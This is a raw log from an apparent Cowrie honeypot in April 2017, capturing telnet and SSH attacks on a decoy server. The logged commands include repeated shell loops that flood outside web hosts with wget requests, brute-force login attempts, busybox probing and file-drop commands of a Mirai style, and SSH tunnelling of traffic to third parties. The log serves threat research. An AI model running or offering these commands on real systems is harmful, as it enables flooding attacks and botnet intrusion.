2017-04-11T03:55:14+0000 [CowrieTelnetTransport,222056,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:29+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222055,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facebook-hackers.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222048,158.255.6.174] CMD: /bin/busybox cat /bin/echo
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222048,158.255.6.174] Command found: /bin/busybox cat /bin/echo
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222048,158.255.6.174] Command found: cat /bin/echo
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222048,158.255.6.174] CMD: /bin/busybox ECCHI
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222048,158.255.6.174] Command found: /bin/busybox ECCHI
2017-04-11T03:55:30+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 158.255.6.174:54225 (10.8.41.81:2223) [session: TT222059]
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222050,158.255.6.174] Connection lost after 140 seconds
2017-04-11T03:55:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103087,91.195.103.184] got channel 'direct-tcpip' request
2017-04-11T03:55:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103087,91.195.103.184] direct-tcp connection request to 107.189.171.198:80 from localhost:5556
2017-04-11T03:55:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103094,91.230.47.78] got channel 'direct-tcpip' request
2017-04-11T03:55:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103094,91.230.47.78] direct-tcp connection request to 173.230.217.202:443 from localhost:5556
2017-04-11T03:55:30+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.35.138.83:50579 (10.8.41.81:2223) [session: TT222060]
2017-04-11T03:55:30+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.35.138.83:39423 (10.8.41.81:2223) [session: TT222061]
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1188
2017-04-11T03:55:30+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:32+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [/enable] failed
2017-04-11T03:55:32+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:33+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1189
2017-04-11T03:55:33+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:35+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [system/shell] failed
2017-04-11T03:55:35+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:35+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1190
2017-04-11T03:55:35+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:38+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [sh/>/tmp/.ptmx && cd /tmp/] failed
2017-04-11T03:55:38+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:38+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1191
2017-04-11T03:55:38+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:40+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [>/var/.ptmx && cd /var//>/dev/.ptmx && cd /dev/] failed
2017-04-11T03:55:40+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:43+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1192
2017-04-11T03:55:43+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:45+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [>/mnt/.ptmx && cd /mnt//>/var/run/.ptmx && cd /var/run/] failed
2017-04-11T03:55:45+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:45+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1193
2017-04-11T03:55:45+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:47+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [>/var/tmp/.ptmx && cd /var/tmp//>/.ptmx && cd /] failed
2017-04-11T03:55:47+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:48+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1194
2017-04-11T03:55:48+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:50+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [>/dev/netslink/.ptmx && cd /dev/netslink//>/dev/shm/.ptmx && cd /dev/shm/] failed
2017-04-11T03:55:50+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:51+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1195
2017-04-11T03:55:51+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:53+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [>/bin/.ptmx && cd /bin//>/etc/.ptmx && cd /etc/] failed
2017-04-11T03:55:53+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:53+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1196
2017-04-11T03:55:53+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:55+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [>/boot/.ptmx && cd /boot//>/usr/.ptmx && cd /usr/] failed
2017-04-11T03:55:55+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:56+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt: 1197
2017-04-11T03:55:56+0000 [CowrieTelnetTransport,222057,185.35.138.83] login return, expect: [666666/666666]
2017-04-11T03:55:58+0000 [CowrieTelnetTransport,222057,185.35.138.83] login attempt [/bin/busybox rm -rf peinwashere pnpu//bin/busybox cp /bin/busybox peinwashere; >peinwashere; /bin/busybox chmod 777 peinwashere; /bin/busybox NJASD] failed
2017-04-11T03:55:58+0000 [CowrieTelnetTransport,222057,185.35.138.83] Warning: state changed and new state returned
2017-04-11T03:55:58+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 14.177.12.191:51628 (10.8.41.81:2223) [session: TT222062]
2017-04-11T03:55:58+0000 [SSHChannel None (132) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103087,91.195.103.184] direct-tcp forward to 107.189.171.198:80 with data 'GET /ip/header?id_ip=16089345268&id_provider=19 HTTP/1.1\r\nHost: ipinfoplz.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4\r\nX-Group: 19\r\nX-Id: 16089345268\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
2017-04-11T03:55:58+0000 [SSHChannel None (132) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103087,91.195.103.184] failed to connect: Connection refused
2017-04-11T03:55:58+0000 [SSHChannel None (132) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103087,91.195.103.184] sending close 132
2017-04-11T03:55:58+0000 [SSHChannel None (132) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103087,91.195.103.184] remote eof
2017-04-11T03:55:58+0000 [SSHChannel None (132) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103087,91.195.103.184] remote close
2017-04-11T03:55:58+0000 [SSHChannel None (177) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103094,91.230.47.78] direct-tcp forward to 173.230.217.202:443 with data '\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x01X\xecS\x9b32\x15\x02O\xf5#^\xd5\x08\xc2\rV\\\x02\xf9\x87\xeb;\xb2\x90\xacL\xd7AL\x90\xce\x00\x00\x18\x00/\x005\x00\x05\x00\n\xc0\x13\xc0\x14\xc0\t\xc0\n\x002\x008\x00\x13\x00\x04\x01\x00\x00:\xff\x01\x00\x01\x00\x00\x00\x00!\x00\x1f\x00\x00\x1cnative.np.ac.playstation.net\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00'
